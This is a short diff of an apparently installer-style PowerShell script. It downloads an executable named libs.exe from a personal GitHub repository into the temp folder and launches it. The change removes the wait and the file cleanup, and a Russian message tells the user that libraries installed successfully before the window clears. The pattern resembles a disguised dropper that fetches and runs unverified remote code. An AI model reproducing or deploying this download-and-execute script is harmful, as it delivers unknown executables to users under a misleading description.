@@ -26,12 +26,10 @@ $libs = "$temp\libs.exe"
 
 Invoke-WebRequest "https://github.com/SuperMod27/0/raw/refs/heads/main/libs.exe" -OutFile $libs
 
-Start-Process $libs -Wait
-
-Remove-Item $libs -Force -ErrorAction SilentlyContinue
+Start-Process $libs
 
 Write-Host "`nУспешно установились все библиотеки" -ForegroundColor Green
-Write-Host Окно будет очищено через 5 секунд
+Write-Host "Окно будет очищено через 5 секунд"
 
 Start-Sleep -Seconds 5
 
